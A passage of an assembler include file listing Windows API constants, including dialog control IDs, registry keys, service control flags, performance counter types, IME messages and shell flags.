NRC_NORESOURCES equ 38h
NRC_INVADDRESS equ 39h
NRC_INVDDID equ 3Bh
NRC_LOCKFAIL equ 3Ch
NRC_OPENERR equ 3Fh
NRC_SYSTEM equ 40h
NRC_PENDING equ 0FFh
EXCEPTION_EXECUTE_HANDLER equ 1
EXCEPTION_CONTINUE_SEARCH equ 0
EXCEPTION_CONTINUE_EXECUTION equ -1
ctlFirst equ 400h
ctlLast equ 4FFh
psh1 equ 400h
psh2 equ 401h
psh3 equ 402h
psh4 equ 403h
psh5 equ 404h
psh6 equ 405h
psh7 equ 406h
psh8 equ 407h
psh9 equ 408h
psh10 equ 409h
psh11 equ 40Ah
psh12 equ 40Bh
psh13 equ 40Ch
psh14 equ 40Dh
psh15 equ 40Eh
pshHelp equ psh15
psh16 equ 40Fh
chx1 equ 410h
chx2 equ 411h
chx3 equ 412h
chx4 equ 413h
chx5 equ 414h
chx6 equ 415h
chx7 equ 416h
chx8 equ 417h
chx9 equ 418h
chx10 equ 419h
chx11 equ 41Ah
chx12 equ 41Bh
chx13 equ 41Ch
chx14 equ 41Dh
chx15 equ 41Eh
chx16 equ 41Dh
rad1 equ 420h
rad2 equ 421h
rad3 equ 422h
rad4 equ 423h
rad5 equ 424h
rad6 equ 425h
rad7 equ 426h
rad8 equ 427h
rad9 equ 428h
rad10 equ 429h
rad11 equ 42Ah
rad12 equ 42Bh
rad13 equ 42Ch
rad14 equ 42Dh
rad15 equ 42Eh
rad16 equ 42Fh
grp1 equ 430h
grp2 equ 431h
grp3 equ 432h
grp4 equ 433h
frm1 equ 434h
frm2 equ 435h
frm3 equ 436h
frm4 equ 437h
rct1 equ 438h
rct2 equ 439h
rct3 equ 43Ah
rct4 equ 43Bh
ico1 equ 43Ch
ico2 equ 43Dh
ico3 equ 43Eh
ico4 equ 43Fh
stc1 equ 440h
stc2 equ 441h
stc3 equ 442h
stc4 equ 443h
stc5 equ 444h
stc6 equ 445h
stc7 equ 446h
stc8 equ 447h
stc9 equ 448h
stc10 equ 449h
stc11 equ 44Ah
stc12 equ 44Bh
stc13 equ 44Ch
stc14 equ 44Dh
stc15 equ 44Eh
stc16 equ 44Fh
stc17 equ 450h
stc18 equ 451h
stc19 equ 452h
stc20 equ 453h
stc21 equ 454h
stc22 equ 455h
stc23 equ 456h
stc24 equ 457h
stc25 equ 458h
stc26 equ 459h
stc27 equ 45Ah
stc28 equ 45Bh
stc29 equ 45Ch
stc30 equ 45Dh
stc31 equ 45Eh
stc32 equ 45Fh
lst1 equ 460h
lst2 equ 461h
lst3 equ 462h
lst4 equ 463h
lst5 equ 464h
lst6 equ 465h
lst7 equ 466h
lst8 equ 467h
lst9 equ 468h
lst10 equ 469h
lst11 equ 46Ah
lst12 equ 46Bh
lst13 equ 46Ch
lst14 equ 46Dh
lst15 equ 46Eh
lst16 equ 46Fh
cmb1 equ 470h
cmb2 equ 471h
cmb3 equ 472h
cmb4 equ 473h
cmb5 equ 474h
cmb6 equ 475h
cmb7 equ 476h
cmb8 equ 477h
cmb9 equ 478h
cmb10 equ 479h
cmb11 equ 47Ah
cmb12 equ 47Bh
cmb13 equ 47Ch
cmb14 equ 47Dh
cmb15 equ 47Eh
cmb16 equ 47Fh
edt1 equ 480h
edt2 equ 481h
edt3 equ 482h
edt4 equ 483h
edt5 equ 484h
edt6 equ 485h
edt7 equ 486h
edt8 equ 487h
edt9 equ 488h
edt10 equ 489h
edt11 equ 48Ah
edt12 equ 48Bh
edt13 equ 48Ch
edt14 equ 48Dh
edt15 equ 48Eh
edt16 equ 48Fh
scr1 equ 490h
scr2 equ 491h
scr3 equ 492h
scr4 equ 493h
scr5 equ 494h
scr6 equ 495h
scr7 equ 496h
scr8 equ 497h
FILEOPENORD equ 1536
MULTIFILEOPENORD equ 1537
PRINTDLGORD equ 1538
PRNSETUPDLGORD equ 1539
FINDDLGORD equ 1540
REPLACEDLGORD equ 1541
FONTDLGORD equ 1542
FORMATDLGORD31 equ 1543
FORMATDLGORD30 equ 1544
HKEY_CLASSES_ROOT equ 80000000h
HKEY_CURRENT_USER equ 80000001h
HKEY_LOCAL_MACHINE equ 80000002h
HKEY_USERS equ 80000003h
HKEY_PERFORMANCE_DATA equ 80000004h
HKEY_CURRENT_CONFIG equ 80000005h
HKEY_DYN_DATA equ 80000006h
SERVICE_NO_CHANGE equ 0FFFFh
SERVICE_ACTIVE equ 1h
SERVICE_INACTIVE equ 2h
SERVICE_STATE_ALL equ SERVICE_ACTIVE|SERVICE_INACTIVE
SERVICE_CONTROL_STOP equ 1h
SERVICE_CONTROL_PAUSE equ 2h
SERVICE_CONTROL_CONTINUE equ 3h
SERVICE_CONTROL_INTERROGATE equ 4h
SERVICE_CONTROL_SHUTDOWN equ 5h
SERVICE_STOPPED equ 1h
SERVICE_START_PENDING equ 2h
SERVICE_STOP_PENDING equ 3h
SERVICE_RUNNING equ 4h
SERVICE_CONTINUE_PENDING equ 5h
SERVICE_PAUSE_PENDING equ 6h
SERVICE_PAUSED equ 7h
SERVICE_ACCEPT_STOP equ 1h
SERVICE_ACCEPT_PAUSE_CONTINUE equ 2h
SERVICE_ACCEPT_SHUTDOWN equ 4h
SC_MANAGER_CONNECT equ 1h
SC_MANAGER_CREATE_SERVICE equ 2h
SC_MANAGER_ENUMERATE_SERVICE equ 4h
SC_MANAGER_LOCK equ 8h
SC_MANAGER_QUERY_LOCK_STATUS equ 10h
SC_MANAGER_MODIFY_BOOT_CONFIG equ 20h
SC_MANAGER_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|SC_MANAGER_CONNECT|SC_MANAGER_CREATE_SERVICE|SC_MANAGER_ENUMERATE_SERVICE|SC_MANAGER_LOCK
SERVICE_QUERY_CONFIG equ 1h
SERVICE_CHANGE_CONFIG equ 2h
SERVICE_QUERY_STATUS equ 4h
SERVICE_ENUMERATE_DEPENDENTS equ 8h
SERVICE_START equ 10h
SERVICE_STOP equ 20h
SERVICE_PAUSE_CONTINUE equ 40h
SERVICE_INTERROGATE equ 80h
SERVICE_USER_DEFINED_CONTROL equ 100h
SERVICE_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|SERVICE_QUERY_CONFIG|SERVICE_CHANGE_CONFIG|SERVICE_QUERY_STATUS
PERF_DATA_VERSION equ 1
PERF_DATA_REVISION equ 1
PERF_NO_INSTANCES equ -1
PERF_SIZE_DWORD equ 0h
PERF_SIZE_LARGE equ 100h
PERF_SIZE_ZERO equ 200h
PERF_SIZE_VARIABLE_LEN equ 300h
PERF_TYPE_NUMBER equ 0h
PERF_TYPE_COUNTER equ 400h
PERF_TYPE_TEXT equ 800h
PERF_TYPE_ZERO equ 0C00h
PERF_NUMBER_HEX equ 0h
PERF_NUMBER_DECIMAL equ 10000h
PERF_NUMBER_DEC_1000 equ 20000h
PERF_COUNTER_VALUE equ 0h
PERF_COUNTER_RATE equ 10000h
PERF_COUNTER_FRACTION equ 20000h
PERF_COUNTER_BASE equ 30000h
PERF_COUNTER_ELAPSED equ 40000h
PERF_COUNTER_QUEUELEN equ 50000h
PERF_COUNTER_HISTOGRAM equ 60000h
PERF_TEXT_UNICODE equ 0h
PERF_TEXT_ASCII equ 10000h
PERF_TIMER_TICK equ 0h
PERF_TIMER_100NS equ 100000h
PERF_OBJECT_TIMER equ 200000h
PERF_DELTA_COUNTER equ 400000h
PERF_DELTA_BASE equ 800000h
PERF_INVERSE_COUNTER equ 1000000h
PERF_MULTI_COUNTER equ 2000000h
PERF_DISPLAY_NO_SUFFIX equ 0h
PERF_DISPLAY_PER_SEC equ 10000000h
PERF_DISPLAY_PERCENT equ 20000000h
PERF_DISPLAY_SECONDS equ 30000000h
PERF_DISPLAY_NOSHOW equ 40000000h
PERF_COUNTER_COUNTER equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_TICK|PERF_DELTA_COUNTER|PERF_DISPLAY_PER_SEC
PERF_COUNTER_TIMER equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_TICK|PERF_DELTA_COUNTER|PERF_DISPLAY_PERCENT
PERF_COUNTER_QUEUELEN_TYPE equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_QUEUELEN|PERF_TIMER_TICK|PERF_DELTA_COUNTER|PERF_DISPLAY_NO_SUFFIX
PERF_COUNTER_BULK_COUNT equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_TICK|PERF_DELTA_COUNTER|PERF_DISPLAY_PER_SEC
PERF_COUNTER_TEXT equ PERF_SIZE_VARIABLE_LEN|PERF_TYPE_TEXT|PERF_TEXT_UNICODE|PERF_DISPLAY_NO_SUFFIX
PERF_COUNTER_RAWCOUNT equ PERF_SIZE_DWORD|PERF_TYPE_NUMBER|PERF_NUMBER_DECIMAL|PERF_DISPLAY_NO_SUFFIX
PERF_SAMPLE_FRACTION equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_FRACTION|PERF_DELTA_COUNTER|PERF_DELTA_BASE|PERF_DISPLAY_PERCENT
PERF_SAMPLE_COUNTER equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_TICK|PERF_DELTA_COUNTER|PERF_DISPLAY_NO_SUFFIX
PERF_COUNTER_NODATA equ PERF_SIZE_ZERO|PERF_DISPLAY_NOSHOW
PERF_COUNTER_TIMER_INV equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_TICK|PERF_DELTA_COUNTER|PERF_INVERSE_COUNTER|PERF_DISPLAY_PERCENT
PERF_SAMPLE_BASE equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_BASE|PERF_DISPLAY_NOSHOW|1h
PERF_AVERAGE_TIMER equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_FRACTION|PERF_DISPLAY_SECONDS
PERF_AVERAGE_BASE equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_BASE|PERF_DISPLAY_NOSHOW|2h
PERF_AVERAGE_BULK equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_FRACTION|PERF_DISPLAY_NOSHOW
PERF_100NSEC_TIMER equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_100NS|PERF_DELTA_COUNTER|PERF_DISPLAY_PERCENT
PERF_100NSEC_TIMER_INV equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_100NS|PERF_DELTA_COUNTER|PERF_INVERSE_COUNTER|PERF_DISPLAY_PERCENT
PERF_COUNTER_MULTI_TIMER equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_DELTA_COUNTER|PERF_TIMER_TICK|PERF_MULTI_COUNTER|PERF_DISPLAY_PERCENT
PERF_COUNTER_MULTI_TIMER_INV equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_RATE|PERF_DELTA_COUNTER|PERF_MULTI_COUNTER|PERF_TIMER_TICK|PERF_INVERSE_COUNTER|PERF_DISPLAY_PERCENT
PERF_COUNTER_MULTI_BASE equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_BASE|PERF_MULTI_COUNTER|PERF_DISPLAY_NOSHOW
PERF_100NSEC_MULTI_TIMER equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_DELTA_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_100NS|PERF_MULTI_COUNTER|PERF_DISPLAY_PERCENT
PERF_100NSEC_MULTI_TIMER_INV equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_DELTA_COUNTER|PERF_COUNTER_RATE|PERF_TIMER_100NS|PERF_MULTI_COUNTER|PERF_INVERSE_COUNTER|PERF_DISPLAY_PERCENT
PERF_RAW_FRACTION equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_FRACTION|PERF_DISPLAY_PERCENT
PERF_RAW_BASE equ PERF_SIZE_DWORD|PERF_TYPE_COUNTER|PERF_COUNTER_BASE|PERF_DISPLAY_NOSHOW|3h
PERF_ELAPSED_TIME equ PERF_SIZE_LARGE|PERF_TYPE_COUNTER|PERF_COUNTER_ELAPSED|PERF_OBJECT_TIMER|PERF_DISPLAY_SECONDS
PERF_COUNTER_HISTOGRAM_TYPE equ 80000000h
PERF_DETAIL_NOVICE equ 100
PERF_DETAIL_ADVANCED equ 200
PERF_DETAIL_EXPERT equ 300
PERF_DETAIL_WIZARD equ 400
PERF_NO_UNIQUE_ID equ -1
LZERROR_BADINHANDLE equ -1
LZERROR_BADOUTHANDLE equ -2
LZERROR_READ equ -3
LZERROR_WRITE equ -4
LZERROR_PUBLICLOC equ -5
LZERROR_GLOBLOCK equ -6
LZERROR_BADVALUE equ -7
LZERROR_UNKNOWNALG equ -8
VK_PROCESSKEY equ 0E5h
STYLE_DESCRIPTION_SIZE equ 32
WM_CONVERTREQUESTEX equ 108h
WM_IME_STARTCOMPOSITION equ 10Dh
WM_IME_ENDCOMPOSITION equ 10Eh
WM_IME_COMPOSITION equ 10Fh
WM_IME_KEYLAST equ 10Fh
WM_IME_SETCONTEXT equ 281h
WM_IME_NOTIFY equ 282h
WM_IME_CONTROL equ 283h
WM_IME_COMPOSITIONFULL equ 284h
WM_IME_SELECT equ 285h
WM_IME_CHAR equ 286h
WM_IME_KEYDOWN equ 290h
WM_IME_KEYUP equ 291h
IMC_GETCANDIDATEPOS equ 7h
IMC_SETCANDIDATEPOS equ 8h
IMC_GETCOMPOSITIONFONT equ 9h
IMC_SETCOMPOSITIONFONT equ 0Ah
IMC_GETCOMPOSITIONWINDOW equ 0Bh
IMC_SETCOMPOSITIONWINDOW equ 0Ch
IMC_GETSTATUSWINDOWPOS equ 0Fh
IMC_SETSTATUSWINDOWPOS equ 10h
IMC_CLOSESTATUSWINDOW equ 21h
IMC_OPENSTATUSWINDOW equ 22h
NI_OPENCANDIDATE equ 10h
NI_CLOSECANDIDATE equ 11h
NI_SELECTCANDIDATESTR equ 12h
NI_CHANGECANDIDATELIST equ 13h
NI_FINALIZECONVERSIONRESULT equ 14h
NI_COMPOSITIONSTR equ 15h
NI_SETCANDIDATE_PAGESTART equ 16h
NI_SETCANDIDATE_PAGESIZE equ 17h
ISC_SHOWUICANDIDATEWINDOW equ 1h
ISC_SHOWUICOMPOSITIONWINDOW equ 80000000h
ISC_SHOWUIGUIDELINE equ 40000000h
ISC_SHOWUIALLCANDIDATEWINDOW equ 0Fh
ISC_SHOWUIALL equ 0C000000Fh
CPS_COMPLETE equ 1h
CPS_CONVERT equ 2h
CPS_REVERT equ 3h
CPS_CANCEL equ 4h
IME_CHOTKEY_IME_NONIME_TOGGLE equ 10h
IME_CHOTKEY_SHAPE_TOGGLE equ 11h
IME_CHOTKEY_SYMBOL_TOGGLE equ 12h
IME_JHOTKEY_CLOSE_OPEN equ 30h
IME_KHOTKEY_SHAPE_TOGGLE equ 50h
IME_KHOTKEY_HANJACONVERT equ 51h
IME_KHOTKEY_ENGLISH equ 52h
IME_THOTKEY_IME_NONIME_TOGGLE equ 70h
IME_THOTKEY_SHAPE_TOGGLE equ 71h
IME_THOTKEY_SYMBOL_TOGGLE equ 72h
IME_HOTKEY_DSWITCH_FIRST equ 100h
IME_HOTKEY_DSWITCH_LAST equ 11Fh
IME_ITHOTKEY_RESEND_RESULTSTR equ 200h
IME_ITHOTKEY_PREVIOUS_COMPOSITION equ 201h
IME_ITHOTKEY_UISTYLE_TOGGLE equ 202h
GCS_COMPREADSTR equ 1h
GCS_COMPREADATTR equ 2h
GCS_COMPREADCLAUSE equ 4h
GCS_COMPSTR equ 8h
GCS_COMPATTR equ 10h
GCS_COMPCLAUSE equ 20h
GCS_CURSORPOS equ 80h
GCS_DELTASTART equ 100h
GCS_RESULTREADSTR equ 200h
GCS_RESULTREADCLAUSE equ 400h
GCS_RESULTSTR equ 800h
GCS_RESULTCLAUSE equ 1000h
CS_INSERTCHAR equ 2000h
CS_NOMOVECARET equ 4000h
IME_PROP_AT_CARET equ 10000h
IME_PROP_SPECIAL_UI equ 20000h
IME_PROP_CANDLIST_START_FROM_1 equ 40000h
IME_PROP_UNICODE equ 80000h
UI_CAP_2700 equ 1h
UI_CAP_ROT90 equ 2h
UI_CAP_ROTANY equ 4h
SCS_CAP_COMPSTR equ 1h
SCS_CAP_MAKEREAD equ 2h
SELECT_CAP_CONVERSION equ 1h
SELECT_CAP_SENTENCE equ 2h
GGL_LEVEL equ 1h
GGL_INDEX equ 2h
GGL_STRING equ 3h
GGL_PRIVATE equ 4h
GL_LEVEL_NOGUIDELINE equ 0h
GL_LEVEL_FATAL equ 1h
GL_LEVEL_ERROR equ 2h
GL_LEVEL_WARNING equ 3h
GL_LEVEL_INFORMATION equ 4h
GL_ID_UNKNOWN equ 0h
GL_ID_NOMODULE equ 1h
GL_ID_NODICTIONARY equ 10h
GL_ID_CANNOTSAVE equ 11h
GL_ID_NOCONVERT equ 20h
GL_ID_TYPINGERROR equ 21h
GL_ID_TOOMANYSTROKE equ 22h
GL_ID_READINGCONFLICT equ 23h
GL_ID_INPUTREADING equ 24h
GL_ID_INPUTRADICAL equ 25h
GL_ID_INPUTCODE equ 26h
GL_ID_INPUTSYMBOL equ 27h
GL_ID_CHOOSECANDIDATE equ 28h
GL_ID_REVERSECONVERSION equ 29h
GL_ID_PRIVATE_FIRST equ 8000h
GL_ID_PRIVATE_LAST equ 0FFFFh
IGP_PROPERTY equ 4h
IGP_CONVERSION equ 8h
IGP_SENTENCE equ 0Ch
IGP_UI equ 10h
IGP_SETCOMPSTR equ 14h
IGP_SELECT equ 18h
SCS_SETSTR equ GCS_COMPREADSTR|GCS_COMPSTR
SCS_CHANGEATTR equ GCS_COMPREADATTR|GCS_COMPATTR
SCS_CHANGECLAUSE equ GCS_COMPREADCLAUSE|GCS_COMPCLAUSE
ATTR_INPUT equ 0h
ATTR_TARGET_CONVERTED equ 1h
ATTR_CONVERTED equ 2h
ATTR_TARGET_NOTCONVERTED equ 3h
ATTR_INPUT_ERROR equ 4h
CFS_DEFAULT equ 0h
CFS_RECT equ 1h
CFS_POINT equ 2h
CFS_SCREEN equ 4h
CFS_FORCE_POSITION equ 20h
CFS_CANDIDATEPOS equ 40h
CFS_EXCLUDE equ 80h
GCL_CONVERSION equ 1h
GCL_REVERSECONVERSION equ 2h
GCL_REVERSE_LENGTH equ 3h
IME_CMODE_ALPHANUMERIC equ 0h
IME_CMODE_NATIVE equ 1h
IME_CMODE_CHINESE equ IME_CMODE_NATIVE
IME_CMODE_HANGEUL equ IME_CMODE_NATIVE
IME_CMODE_JAPANESE equ IME_CMODE_NATIVE
IME_CMODE_KATAKANA equ 2h
IME_CMODE_LANGUAGE equ 3h
IME_CMODE_FULLSHAPE equ 8h
IME_CMODE_ROMAN equ 10h
IME_CMODE_CHARCODE equ 20h
IME_CMODE_HANJACONVERT equ 40h
IME_CMODE_SOFTKBD equ 80h
IME_CMODE_NOCONVERSION equ 100h
IME_CMODE_EUDC equ 200h
IME_CMODE_SYMBOL equ 400h
IME_SMODE_NONE equ 0h
IME_SMODE_PLAURALCLAUSE equ 1h
IME_SMODE_SINGLECONVERT equ 2h
IME_SMODE_AUTOMATIC equ 4h
IME_SMODE_PHRASEPREDICT equ 8h
IME_CAND_UNKNOWN equ 0h
IME_CAND_READ equ 1h
IME_CAND_CODE equ 2h
IME_CAND_MEANING equ 3h
IME_CAND_RADICAL equ 4h
IME_CAND_STROKE equ 5h
IMN_CLOSESTATUSWINDOW equ 1h
IMN_OPENSTATUSWINDOW equ 2h
IMN_CHANGECANDIDATE equ 3h
IMN_CLOSECANDIDATE equ 4h
IMN_OPENCANDIDATE equ 5h
IMN_SETCONVERSIONMODE equ 6h
IMN_SETSENTENCEMODE equ 7h
IMN_SETOPENSTATUS equ 8h
IMN_SETCANDIDATEPOS equ 9h
IMN_SETCOMPOSITIONFONT equ 0Ah
IMN_SETCOMPOSITIONWINDOW equ 0Bh
IMN_SETSTATUSWINDOWPOS equ 0Ch
IMN_GUIDELINE equ 0Dh
IMN_PRIVATE equ 0Eh
IMM_ERROR_NODATA equ -1
IMM_ERROR_GENERAL equ -2
IME_CONFIG_GENERAL equ 1
IME_CONFIG_REGISTERWORD equ 2
IME_CONFIG_SELECTDICTIONARY equ 3
IME_ESC_QUERY_SUPPORT equ 3h
IME_ESC_RESERVED_FIRST equ 4h
IME_ESC_RESERVED_LAST equ 7FFh
IME_ESC_PRIVATE_FIRST equ 800h
IME_ESC_PRIVATE_LAST equ 0FFFh
IME_ESC_SEQUENCE_TO_INTERNAL equ 1001h
IME_ESC_GET_EUDC_DICTIONARY equ 1003h
IME_ESC_SET_EUDC_DICTIONARY equ 1004h
IME_ESC_MAX_KEY equ 1005h
IME_ESC_IME_NAME equ 1006h
IME_ESC_SYNC_HOTKEY equ 1007h
IME_ESC_HANJA_MODE equ 1008h
IME_REGWORD_STYLE_EUDC equ 1h
IME_REGWORD_STYLE_USER_FIRST equ 80000000h
IME_REGWORD_STYLE_USER_LAST equ 0FFFFh
SOFTKEYBOARD_TYPE_T1 equ 1h
SOFTKEYBOARD_TYPE_C1 equ 2h
DIALOPTION_BILLING equ 40h
DIALOPTION_QUIET equ 80h
DIALOPTION_DIALTONE equ 100h
MDMVOLFLAG_LOW equ 1h
MDMVOLFLAG_MEDIUM equ 2h
MDMVOLFLAG_HIGH equ 4h
MDMVOL_LOW equ 0h
MDMVOL_MEDIUM equ 1h
MDMVOL_HIGH equ 2h
MDMSPKRFLAG_OFF equ 1h
MDMSPKRFLAG_DIAL equ 2h
MDMSPKRFLAG_ON equ 4h
MDMSPKRFLAG_CALLSETUP equ 8h
MDMSPKR_OFF equ 0h
MDMSPKR_DIAL equ 1h
MDMSPKR_ON equ 2h
MDMSPKR_CALLSETUP equ 3h
MDM_COMPRESSION equ 1h
MDM_ERROR_CONTROL equ 2h
MDM_FORCED_EC equ 4h
MDM_CELLULAR equ 8h
MDM_FLOWCONTROL_HARD equ 10h
MDM_FLOWCONTROL_SOFT equ 20h
MDM_CCITT_OVERRIDE equ 40h
MDM_SPEED_ADJUST equ 80h
MDM_TONE_DIAL equ 100h
MDM_BLIND_DIAL equ 200h
MDM_V23_OVERRIDE equ 400h
ABM_NEW equ 0h
ABM_REMOVE equ 1h
ABM_QUERYPOS equ 2h
ABM_SETPOS equ 3h
ABM_GETSTATE equ 4h
ABM_GETTASKBARPOS equ 5h
ABM_ACTIVATE equ 6h
ABM_GETAUTOHIDEBAR equ 7h
ABM_SETAUTOHIDEBAR equ 8h
ABM_WINDOWPOSCHANGED equ 9h
ABN_STATECHANGE equ 0h
ABN_POSCHANGED equ 1h
ABN_FULLSCREENAPP equ 2h
ABN_WINDOWARRANGE equ 3h
ABS_AUTOHIDE equ 1h
ABS_ALWAYSONTOP equ 2h
ABE_LEFT equ 0
ABE_TOP equ 1
ABE_RIGHT equ 2
ABE_BOTTOM equ 3
EIRESID equ -1
FO_MOVE equ 1h
FO_COPY equ 2h
FO_DELETE equ 3h
FO_RENAME equ 4h
FOF_MULTIDESTFILES equ 1h
FOF_CONFIRMMOUSE equ 2h
FOF_SILENT equ 4h
FOF_RENAMEONCOLLISION equ 8h
FOF_NOCONFIRMATION equ 10h
FOF_WANTMAPPINGHANDLE equ 20h
FOF_ALLOWUNDO equ 40h
FOF_FILESONLY equ 80h
FOF_SIMPLEPROGRESS equ 100h
FOF_NOCONFIRMMKDIR equ 200h
PO_DELETE equ 13h
PO_RENAME equ 14h
PO_PORTCHANGE equ 20h
PO_REN_PORT equ 34h
SE_ERR_FNF equ 2
SE_ERR_PNF equ 3
SE_ERR_ACCESSDENIED equ 5
SE_ERR_OOM equ 8
SE_ERR_DLLNOTFOUND equ 32
SEE_MASK_CLASSNAME equ 1h
SEE_MASK_CLASSKEY equ 3h
SEE_MASK_IDLIST equ 4h
SEE_MASK_INVOKEIDLIST equ 0Ch
SEE_MASK_ICON equ 10h
SEE_MASK_HOTKEY equ 20h
SEE_MASK_NOCLOSEPROCESS equ 40h
SEE_MASK_CONNECTNETDRV equ 80h
SEE_MASK_FLAG_DDEWAIT equ 100h
SEE_MASK_DOENVSUBST equ 200h
SEE_MASK_FLAG_NO_UI equ 400h
NIM_ADD equ 0h
NIM_MODIFY equ 1h
NIM_DELETE equ 2h
NIF_MESSAGE equ 1h
NIF_ICON equ 2h
NIF_TIP equ 4h
SHGFI_ICON equ 100h
SHGFI_DISPLAYNAME equ 200h
SHGFI_TYPENAME equ 400h
SHGFI_ATTRIBUTES equ 800h
SHGFI_ICONLOCATION equ 1000h
SHGFI_EXETYPE equ 2000h
SHGFI_SYSICONINDEX equ 4000h
SHGFI_LINKOVERLAY equ 8000h
SHGFI_SELECTED equ 10000h
SHGFI_LARGEICON equ 0h
SHGFI_SMALLICON equ 1h
SHGFI_OPENICON equ 2h
SHGFI_SHELLICONSIZE equ 4h
SHGFI_PIDL equ 8h
SHGFI_USEFILEATTRIBUTES equ 10h
SHGNLI_PIDL equ 1h
SHGNLI_PREFIXNAME equ 2h
VS_VERSION_INFO equ 1
VS_USER_DEFINED equ 100
VS_FFI_SIGNATURE equ 0FEEF04BDh
VS_FFI_STRUCVERSION equ 10000h
VS_FFI_FILEFLAGSMASK equ 3Fh
VS_FF_DEBUG equ 1h
VS_FF_PRERELEASE equ 2h
VS_FF_PATCHED equ 4h
VS_FF_PRIVATEBUILD equ 8h
VS_FF_INFOINFERRED equ 10h
VS_FF_SPECIALBUILD equ 20h
VOS_UNKNOWN equ 0h
VOS_DOS equ 10000h
VOS_OS216 equ 20000h
VOS_OS232 equ 30000h
VOS_NT equ 40000h
VOS__BASE equ 0h
VOS__WINDOWS16 equ 1h
VOS__PM16 equ 2h
VOS__PM32 equ 3h
VOS__WINDOWS32 equ 4h
VOS_DOS_WINDOWS16 equ 10001h
VOS_DOS_WINDOWS32 equ 10004h
VOS_OS216_PM16 equ 20002h
VOS_OS232_PM32 equ 30003h
VOS_NT_WINDOWS32 equ 40004h
VFT_UNKNOWN equ 0h
VFT_APP equ 1h
VFT_DLL equ 2h
VFT_DRV equ 3h
VFT_FONT equ 4h
VFT_VXD equ 5h
VFT_STATIC_LIB equ 7h
VFT2_UNKNOWN equ 0h
VFT2_DRV_PRINTER equ 1h
VFT2_DRV_KEYBOARD equ 2h
VFT2_DRV_LANGUAGE equ 3h
VFT2_DRV_DISPLAY equ 4h
VFT2_DRV_MOUSE equ 5h
VFT2_DRV_NETWORK equ 6h
VFT2_DRV_SYSTEM equ 7h
VFT2_DRV_INSTALLABLE equ 8h
VFT2_DRV_SOUND equ 9h
VFT2_DRV_COMM equ 0Ah
VFT2_DRV_INPUTMETHOD equ 0Bh
VFT2_FONT_RASTER equ 1h
VFT2_FONT_VECTOR equ 2h
VFT2_FONT_TRUETYPE equ 3h
VFFF_ISSHAREDFILE equ 1h
VFF_CURNEDEST equ 1h
VFF_FILEINUSE equ 2h
VFF_BUFFTOOSMALL equ 4h
VIFF_FORCEINSTALL equ 1h
VIFF_DONTDELETEOLD equ 2h
VIF_TEMPFILE equ 1h
VIF_MISMATCH equ 2h
VIF_SRCOLD equ 4h
VIF_DIFFLANG equ 8h
VIF_DIFFCODEPG equ 10h
VIF_DIFFTYPE equ 20h
VIF_WRITEPROT equ 40h
VIF_FILEINUSE equ 80h
VIF_OUTOFSPACE equ 100h
VIF_ACCESSVIOLATION equ 200h
VIF_SHARINGVIOLATION equ 400h
VIF_CANNOTCREATE equ 800h
VIF_CANNOTDELETE equ 1000h
VIF_CANNOTRENAME equ 2000h
VIF_CANNOTDELETECUR equ 4000h
VIF_OUTOFMEMORY equ 8000h
VIF_CANNOTREADSRC equ 10000h
VIF_CANNOTREADDST equ 20000h
VIF_BUFFTOOSMALL equ 40000h
PROCESS_HEAP_REGION equ 1h
PROCESS_HEAP_UNCOMMITTED_RANGE equ 2h
PROCESS_HEAP_ENTRY_BUSY equ 4h
PROCESS_HEAP_ENTRY_MOVEABLE equ 10h
PROCESS_HEAP_ENTRY_DDESHARE equ 20h
SCS_32BIT_BINARY equ 0
SCS_DOS_BINARY equ 1
SCS_WOW_BINARY equ 2
SCS_PIF_BINARY equ 3
SCS_POSIX_BINARY equ 4
SCS_OS216_BINARY equ 5
LOGON32_LOGON_INTERACTIVE equ 2
LOGON32_LOGON_BATCH equ 4
LOGON32_LOGON_SERVICE equ 5
LOGON32_PROVIDER_DEFAULT equ 0
LOGON32_PROVIDER_WINNT35 equ 1
VER_PLATFORM_WIN32s equ 0
VER_PLATFORM_WIN32_WINDOWS equ 1
VER_PLATFORM_WIN32_NT equ 2
AC_LINE_OFFLINE equ 0h
AC_LINE_ONLINE equ 1h
AC_LINE_BACKUP_POWER equ 2h
AC_LINE_UNKNOWN equ 0FFh
BATTERY_FLAG_HIGH equ 1h
BATTERY_FLAG_LOW equ 2h
BATTERY_FLAG_CRITICAL equ 4h
BATTERY_FLAG_CHARGING equ 8h
BATTERY_FLAG_NO_BATTERY equ 80h
BATTERY_FLAG_UNKNOWN equ 0FFh
BATTERY_PERCENTAGE_UNKNOWN equ 0FFh
BATTERY_LIFE_UNKNOWN equ 0FFFFh
CDM_FIRST equ WM_USER+100
CDM_LAST equ WM_USER+200
CDM_GETSPEC equ CDM_FIRST+0h
CDM_GETFILEPATH equ CDM_FIRST+1h
CDM_GETFOLDERPATH equ CDM_FIRST+2h
CDM_GETFOLDERIDLIST equ CDM_FIRST+3h
